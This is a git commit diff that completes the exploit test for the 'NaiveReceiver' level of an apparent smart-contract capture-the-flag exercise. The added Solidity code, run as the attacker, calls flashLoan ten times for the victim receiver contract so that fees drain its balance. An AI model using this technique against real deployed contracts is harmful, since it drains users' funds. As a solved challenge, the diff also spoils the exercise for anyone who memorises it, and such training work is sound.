46579a46e1f7c6d129b3d8bda2d342ed6bb8ded6
Jayakumar2812 <jayakumargowtham2812@gmail.com>
2022-12-12 10:47:51 +0530

    completed NaiveReceiver

--- test/Levels/naive-receiver/NaiveReceiver.t.sol
+++ test/Levels/naive-receiver/NaiveReceiver.t.sol
@@ -49,7 +49,11 @@ contract NaiveReceiver is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        for (uint256 i = 0;i<10;i++){
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),1);
+        }
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
